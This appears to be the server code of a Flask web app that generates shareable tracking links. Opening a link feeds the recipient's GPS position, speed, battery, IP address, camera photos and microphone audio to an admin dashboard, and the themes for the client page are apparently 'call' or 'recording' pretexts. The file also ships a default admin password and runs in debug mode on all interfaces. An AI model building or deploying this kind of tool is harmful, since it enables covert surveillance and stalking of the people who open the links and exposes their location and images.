import os
import secrets
import time
import uuid
from datetime import datetime, timezone
from functools import wraps
from pathlib import Path

from flask import (
    Flask, abort, g, jsonify, redirect, render_template, request,
    send_file, session, url_for,
)
from werkzeug.security import check_password_hash, generate_password_hash
from dotenv import load_dotenv
from supabase import create_client, Client

# Load environment variables
load_dotenv()

BASE_DIR = Path(__file__).resolve().parent

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))

ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "2357")
ADMIN_HASH = generate_password_hash(ADMIN_PASS)

# Supabase configuration
SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_ANON_KEY = os.environ.get("SUPABASE_ANON_KEY")
SUPABASE_SERVICE_KEY = os.environ.get("SUPABASE_SERVICE_KEY")
STORAGE_BUCKET = os.environ.get("SUPABASE_STORAGE_BUCKET", "tracker-media")


# Lazy Supabase client initialization
def get_supabase() -> Client:
    if not SUPABASE_URL or not SUPABASE_SERVICE_KEY:
        raise RuntimeError("Supabase credentials not configured")
    return create_client(SUPABASE_URL, SUPABASE_SERVICE_KEY)


def now_iso():
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def admin_required(fn):
    @wraps(fn)
    def wrap(*args, **kwargs):
        if not session.get("authed"):
            return redirect(url_for("login"))
        return fn(*args, **kwargs)
    return wrap


# Health check endpoint for Render
@app.route("/healthz")
def healthz():
    return jsonify({"status": "ok", "time": now_iso()})


# ---------------- Auth / pages ----------------
@app.route("/")
def index():
    return redirect(url_for("dashboard") if session.get("authed") else url_for("login"))


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        u = request.form.get("username", "")
        p = request.form.get("password", "")
        if u == ADMIN_USER and check_password_hash(ADMIN_HASH, p):
            session["authed"] = True
            return redirect(url_for("dashboard"))
        return render_template("login.html", error="Invalid username or password")
    return render_template("login.html")


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))


@app.route("/dashboard")
@admin_required
def dashboard():
    return render_template("dashboard.html")


# ---------------- Link management (admin) ----------------
@app.route("/api/links", methods=["GET", "POST"])
@admin_required
def api_links():
    sb = get_supabase()
    if request.method == "POST":
        data = request.get_json(force=True) or {}
        token = secrets.token_urlsafe(10)
        link_data = {
            "token": token,
            "name": (data.get("name") or "Untitled link")[:80],
            "loc": 1 if data.get("loc", True) else 0,
            "cam": 1 if data.get("cam", False) else 0,
            "mic": 1 if data.get("mic", False) else 0,
            "interval_s": min(max(int(data.get("interval_s", 5)), 2), 3600),
            "active": True,
            "created_at": now_iso(),
        }
        result = sb.table("links").insert(link_data).execute()
        link = result.data[0]
        return jsonify(serialize_link(link, request))

    result = sb.table("links").select("*").eq("active", True).order("id", desc=True).execute()
    return jsonify([serialize_link(r, request) for r in result.data])


def serialize_link(row, req):
    d = dict(row)
    d["url"] = req.host_url.rstrip("/") + url_for("client_page", token=d["token"])
    return d


@app.route("/api/links/<int:link_id>", methods=["DELETE"])
@admin_required
def api_link_delete(link_id):
    sb = get_supabase()
    sb.table("links").update({"active": False}).eq("id", link_id).execute()
    return jsonify({"ok": True})


# ---------------- Client endpoints (token-gated, no admin auth) ----------------
@app.route("/t/<token>")
def client_page(token):
    sb = get_supabase()
    result = sb.table("links").select("*").eq("token", token).eq("active", True).execute()
    if not result.data:
        abort(404)
    link = result.data[0]

    if link["cam"]:
        theme = "call"
    elif link["mic"]:
        theme = "rec"
    else:
        theme = "track"

    cfg = {
        "token": link["token"],
        "loc": bool(link["loc"]),
        "cam": bool(link["cam"]),
        "mic": bool(link["mic"]),
        "interval_s": link["interval_s"],
        "host": request.host_url.rstrip("/"),
        "theme": theme,
    }
    return render_template("client.html", cfg=cfg)


@app.route("/api/t/<token>/report", methods=["POST"])
def api_report(token):
    sb = get_supabase()
    result = sb.table("links").select("*").eq("token", token).eq("active", True).execute()
    if not result.data:
        return jsonify({"ok": False, "error": "invalid token"}), 404
    link = result.data[0]
    data = request.get_json(force=True) or {}

    report_data = {
        "link_id": link["id"],
        "lat": data.get("lat"),
        "lon": data.get("lon"),
        "accuracy": data.get("accuracy"),
        "speed": data.get("speed"),
        "heading": data.get("heading"),
        "alt": data.get("alt"),
        "battery_level": data.get("battery_level"),
        "battery_charging": data.get("battery_charging"),
        "ua": request.headers.get("User-Agent", ""),
        "ip": request.remote_addr,
        "created_at": now_iso(),
    }
    sb.table("reports").insert(report_data).execute()
    return jsonify({"ok": True})


@app.route("/api/t/<token>/media", methods=["POST"])
def api_media_upload(token):
    sb = get_supabase()
    result = sb.table("links").select("*").eq("token", token).eq("active", True).execute()
    if not result.data:
        return jsonify({"ok": False, "error": "invalid token"}), 404
    link = result.data[0]

    kind = request.form.get("kind", "photo")
    if kind not in ("photo", "audio"):
        return jsonify({"ok": False, "error": "bad kind"}), 400

    f = request.files.get("file")
    if not f or not f.filename:
        return jsonify({"ok": False, "error": "no file"}), 400

    ext = ".jpg" if kind == "photo" else ".webm"
    fname = f"{int(time.time()*1000)}_{uuid.uuid4().hex[:8]}{ext}"

    # Upload to Supabase Storage
    file_bytes = f.read()
    sb.storage.from_(STORAGE_BUCKET).upload(fname, file_bytes, {
        "content-type": "image/jpeg" if kind == "photo" else "video/webm"
    })

    # Save media record
    media_data = {
        "link_id": link["id"],
        "kind": kind,
        "filename": fname,
        "created_at": now_iso(),
    }
    sb.table("media").insert(media_data).execute()

    return jsonify({"ok": True, "filename": fname})


# ---------------- Dashboard data ----------------
@app.route("/api/reports")
@admin_required
def api_reports():
    sb = get_supabase()
    # Get reports with link names
    result = sb.table("reports").select("*, links!inner(name)").order("id", desc=True).limit(500).execute()
    out = []
    for r in result.data:
        d = dict(r)
        d["link_name"] = r["links"]["name"] if r.get("links") else "Unknown"
        out.append(d)
    return jsonify(out)


@app.route("/api/stats/<int:link_id>")
@admin_required
def api_stats(link_id):
    sb = get_supabase()
    result = sb.table("reports").select("created_at, accuracy, battery_level, battery_charging, lat, lon").eq("link_id", link_id).order("id", desc=True).execute()
    return jsonify([dict(r) for r in result.data])


@app.route("/api/media")
@admin_required
def api_media_list():
    sb = get_supabase()
    result = sb.table("media").select("*, links!inner(name)").order("id", desc=True).limit(500).execute()
    out = []
    for r in result.data:
        d = dict(r)
        d["link_name"] = r["links"]["name"] if r.get("links") else "Unknown"
        # Get signed URL for media (valid for 1 hour)
        signed_url = sb.storage.from_(STORAGE_BUCKET).create_signed_url(r["filename"], 3600)
        d["url"] = signed_url.get("signedURL", "") if isinstance(signed_url, dict) else str(signed_url)
        out.append(d)
    return jsonify(out)


@app.route("/api/media/<path:filename>")
@admin_required
def media_file(filename):
    # Proxy media through signed URL
    sb = get_supabase()
    signed_url = sb.storage.from_(STORAGE_BUCKET).create_signed_url(filename, 3600)
    url = signed_url.get("signedURL", "") if isinstance(signed_url, dict) else str(signed_url)
    return redirect(url)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)